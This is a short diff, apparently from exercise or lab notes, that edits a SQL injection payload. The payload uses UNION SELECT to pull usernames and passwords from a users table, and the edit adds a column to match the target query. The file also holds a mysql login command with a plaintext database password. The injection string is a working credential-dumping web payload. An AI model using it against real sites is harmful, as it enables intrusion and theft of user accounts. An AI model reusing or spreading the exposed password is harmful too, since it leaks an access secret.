@@ -1,4 +1,4 @@
-' UNION SELECT 1, username, password, 9.99 FROM users -- 
+' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users -- 
 
 
 mysql -u dbuser -pcinvestav123 ecommerce
